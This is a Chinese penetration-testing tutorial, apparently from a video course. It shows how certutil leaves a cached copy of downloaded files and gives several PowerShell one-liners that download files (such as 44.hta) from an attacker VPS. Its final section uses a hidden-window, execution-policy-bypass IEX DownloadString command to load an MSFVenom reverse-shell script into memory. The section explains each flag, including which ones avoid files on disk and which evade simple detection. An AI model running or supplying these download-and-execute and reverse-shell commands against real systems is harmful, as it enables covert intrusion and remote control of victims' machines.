## Certutil命令的缓存特性
上一节我们介绍了利用系统自带工具下载文件的基本思路。本节中我们来看看`certutil`命令的一个需要注意的特性。

使用`certutil`命令下载文件后，系统会保留一份缓存。这份缓存文件存储在特定的目录中。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_17.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_19.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_21.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_23.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_24.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_26.png)

以下是操作步骤：
1.  首先，清除该目录下可能存在的旧缓存文件。
2.  然后，重新执行`certutil`下载命令。
3.  命令执行后，不仅会下载目标文件，还会在缓存目录中留存一份副本。
4.  查看缓存文件的内容，可以确认其与下载的文件完全一致。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_28.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_29.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_34.png)

因此，当我们使用`certutil`命令下载木马或脚本后，会在系统缓存目录中留下痕迹。

### 方法一：分步下载
首先，我们需要进入PowerShell环境。在CMD中输入`powershell`命令即可进入，其命令行提示符前会显示`PS`。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_65.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_66.png)

以下是将下载功能分为两个步骤的语句，便于理解：
1.  第一部分通过`New-Object`创建一个`System.Net.WebClient`对象，并将其赋值给变量`$p`（`$`符号表示变量）。
    *   `New-Object`用于创建对象。
    *   `System.Net.WebClient`对象提供了用于发送和接收URI标识资源数据的方法，我们可以通过它来下载指定的资源。
2.  第二部分调用该对象的`DownloadFile`方法。
    *   `DownloadFile`是该对象提供的一个方法，从字面意思可知其用于下载文件。
    *   该方法接收两个参数：要下载资源的URL地址，以及文件保存到本地的路径。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_68.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_70.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_72.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_74.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_76.png)

我们以下载`44.hta`文件为例进行演示：
1.  首先进入PowerShell环境。
2.  执行创建对象的命令：`$p = New-Object System.Net.WebClient`
3.  执行下载命令：`$p.DownloadFile(“http://your-vps-ip/44.hta”, “./44.hta”)`
4.  执行后，在当前目录下会生成`44.hta`文件，表明下载成功。

### 方法二：单条命令执行
在实际渗透中，我们获得的Shell环境可能不是持久的PowerShell会话。为了在单次命令执行中完成下载，可以将上述两条命令合并。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_89.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_91.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_93.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_94.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_96.png)

以下语句通过分号`;`分隔，将两条命令合并为一条PowerShell语句：
```powershell
powershell -c "$p = New-Object System.Net.WebClient; $p.DownloadFile('http://your-vps-ip/44.hta', './44.hta')"
```
*   `-c`（或`-Command`）参数用于指定要执行的命令。
*   其作用与分步执行完全相同，只是写法更紧凑，适用于单次命令调用。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_98.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_100.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_102.png)

### 方法三：简化的对象创建与调用
这是另一种常见的写法，作用与上述方法相同，但形式更简洁直观。
```powershell
(New-Object System.Net.WebClient).DownloadFile(“http://your-vps-ip/44.hta”, “./s.hta”)
```
这条命令直接创建`WebClient`对象并立即调用其`DownloadFile`方法，无需使用变量存储对象。

### 方法四：使用Invoke-WebRequest
除了`WebClient`对象，PowerShell还提供了`Invoke-WebRequest`命令（别名：`iwr`、`wget`、`curl`）用于处理Web请求。

我们可以通过`help Invoke-WebRequest`命令查看其详细用法。其基本语法是`Invoke-WebRequest -Uri [URL]`。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_129.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_131.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_133.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_135.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_137.png)

用于下载文件的例子如下，使用`-OutFile`参数指定保存路径：
```powershell
powershell -c “Invoke-WebRequest -Uri ‘http://your-vps-ip/44.hta’ -OutFile ‘D:\44.hta’”
```
*   在PowerShell中，`$env:temp`变量表示系统的临时目录（通常为`C:\Windows\Temp`）。
*   我们可以指定任意存在的路径来保存文件。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_139.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_140.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_142.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_144.png)

`Invoke-WebRequest`的命令别名（`iwr`, `wget`, `curl`）同样有效，例如：
```powershell
powershell -c “iwr ‘http://your-vps-ip/44.hta’ -OutFile ‘D:\44.hta’”
```

## 实战：PowerShell加载远程脚本反弹Shell
下面我们来看一个实际例子：通过PowerShell加载远程的PowerShell脚本，从而反弹一个Shell会话。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_175.png)

我们使用MSFVenom生成一个PowerShell格式的反弹Shell脚本（`shell.ps1`），并托管在VPS上。在MSF中设置好对应的监听器（例如监听端口8888）。

![](img/f0d060c149bd5d2ca1978a5c30f6a800_177.png)

![](img/f0d060c149bd5d2ca1978a5c30f6a800_179.png)

在目标机器上执行以下命令：
```powershell
powershell -w hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://your-vps-ip/shell.ps1’)”
```
命令执行后，MSF监听器会成功接收到反弹回来的Shell会话。执行命令的CMD窗口会自动关闭，这是因为`-w hidden`参数将窗口样式设置为隐藏。

下面对命令中的关键参数进行解析：
*   `-w hidden`： 设置窗口状态为隐藏（`-WindowStyle Hidden`的简写）。其他选项包括`Normal`（正常）、`Minimized`（最小化）、`Maximized`（最大化）。
*   `-exec bypass` 或 `-ep bypass`： 设置执行策略为`Bypass`，绕过系统默认的脚本执行限制。Windows PowerShell默认可能阻止脚本运行，此参数可解决该问题。
*   `IEX`（`Invoke-Expression`）： 将字符串作为命令执行。这里用于执行下载到内存中的脚本内容。
*   `DownloadString`： 与`DownloadFile`不同，`DownloadString`方法将远程文件内容作为字符串加载到内存中执行，不会在本地磁盘留下文件。
*   `-nop`（`-NoProfile`）： 不加载当前用户的配置文件，使会话更简洁。
*   `-e`（`-EncodedCommand`）： 接受Base64编码的命令字符串，可用于绕过一些简单的检测。
